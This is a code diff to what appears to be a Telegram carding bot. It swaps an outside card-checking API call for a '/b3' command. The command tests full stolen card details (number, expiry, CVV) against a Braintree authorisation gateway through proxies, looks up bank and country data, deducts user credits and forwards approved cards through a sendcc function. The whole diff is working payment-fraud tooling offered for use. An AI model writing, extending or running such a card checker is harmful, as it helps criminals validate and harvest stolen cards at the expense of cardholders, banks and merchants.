@@ -10,54 +10,105 @@ from .response import *
 from .gate import *
 
 
-import json
-import requests
-from telegram import Update
-from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
-
-# Function to fetch card details from API
-def check_card(card_number):
-    url = f"https://darkboy-b3.onrender.com/key=dark/cc={card_number}"
-    
+@Client.on_message(filters.command("b3", [".", "/"]))
+async def b3_auth_cmd(Client, message):
     try:
-        response = requests.get(url, timeout=10)
-        
-        if response.status_code == 200:
-            return response.text
-        else:
-            return f"⚠️ API Error: {response.status_code} - {response.reason}"
-    
-    except requests.exceptions.RequestException as e:
-        return f"❌ Request Failed: {e}"
+        user_id = str(message.from_user.id)
+        checkall = await check_all_thing(Client, message)
 
-# Handler for 'tn <card_number>' command
-def tn_handler(update: Update, context: CallbackContext):
-    message = update.message.text
-    parts = message.split()
+        gateway = "Braintree Auth"
 
-    # Validate command format
-    if len(parts) != 2 or not parts[1].isdigit() or not (13 <= len(parts[1]) <= 19):
-        update.message.reply_text("❌ Invalid format. Use: tn <card_number>")
-        return
-    
-    card_number = parts[1]
-    
-    update.message.reply_text(f"🔍 Checking card `{card_number}`... Please wait.", parse_mode="Markdown")
+        if checkall[0] == False:
+            return
 
-    # Fetch response from API
-    response = check_card(card_number)
+        role = checkall[1]
+        getcc = await getmessage(message)
+        if getcc == False:
+            resp = f"""<b>
+Gate Name: {gateway} ♻️
+CMD: /b3
 
-    # Send response to user
-    update.message.reply_text(f"📡 **Response:**\n{response}", parse_mode="Markdown")
+Message: No CC Found in your input ❌
 
-# Main function to start the bot
-def main():
-    updater = Updater(TOKEN, use_context=True)
-    dispatcher = updater.dispatcher
+Usage: /b3 cc|mes|ano|cvv</b>"""
+            await message.reply_text(resp, message.id)
+            return
 
-    # Add message handler for 'tn <card_number>' command
-    dispatcher.add_handler(MessageHandler(Filters.text & Filters.regex(r'^tn \d{13,19}$'), tn_handler))
+        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
+        fullcc = f"{cc}|{mes}|{ano}|{cvv}"
 
-    # Start the bot
-    updater.start_polling()
-    updater.idle()
+        firstresp = f"""
+↯ Checking.
+
+- 𝗖𝗮𝗿𝗱 - <code>{fullcc}</code> 
+- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>{gateway}</i>
+- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■□□□
+</b>
+"""
+        await asyncio.sleep(0.5)
+        firstchk = await message.reply_text(firstresp, message.id)
+
+        secondresp = f"""
+↯ Checking..
+
+- 𝗖𝗮𝗿𝗱 - <code>{fullcc}</code> 
+- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>{gateway}</i>
+- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■□
+"""
+        await asyncio.sleep(0.5)
+        secondchk = await Client.edit_message_text(message.chat.id, firstchk.id, secondresp)
+
+        start = time.perf_counter()
+        proxies = await get_proxy_format()  # Pass user_id here
+
+        session = httpx.AsyncClient(timeout=30, proxies=proxies, follow_redirects=True)
+        result = await create_braintree_auth(fullcc, session)
+        getbin = await get_bin_details(cc)
+        getresp = await get_charge_resp(result, user_id, fullcc)
+        status = getresp["status"]
+        response = getresp["response"]
+
+        thirdresp = f"""
+↯ Checking...
+
+- 𝗖𝗮𝗿𝗱 - <code>{fullcc}</code> 
+- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>{gateway}</i>
+- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■■
+"""
+        await asyncio.sleep(0.5)
+        thirdcheck = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp)
+
+        brand = getbin[0]
+        type = getbin[1]
+        level = getbin[2]
+        bank = getbin[3]
+        country = getbin[4]
+        flag = getbin[5]
+        currency = getbin[6]
+
+        # Split the final response into shorter parts
+        finalresp1 = f"""
+{status}
+
+𝗖𝗮𝗿𝗱- <code>{fullcc}</code> 
+𝐆𝐚𝐭𝐞𝐰𝐚𝐲- <i>{gateway}</i>
+𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞- ⤿ <i>{response}</i> ⤾
+
+𝗜𝗻𝗳𝗼- {brand} - {type} - {level}
+𝐁𝐚𝐧𝐤- {bank} 
+𝐂𝐨𝐮𝐧𝐭𝐫𝐲- {country} - {flag} - {currency}
+
+𝗧𝗶𝗺𝗲- {time.perf_counter() - start:0.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
+"""
+        await asyncio.sleep(0.5)
+        await Client.edit_message_text(message.chat.id, thirdcheck.id, finalresp1)
+
+        await setantispamtime(user_id)
+        await deductcredit(user_id)
+        if status == "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅" or status == "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅":
+            await sendcc(finalresp1, session)
+        await session.aclose()
+
+    except Exception as e:
+        import traceback
+        await error_log(traceback.format_exc())
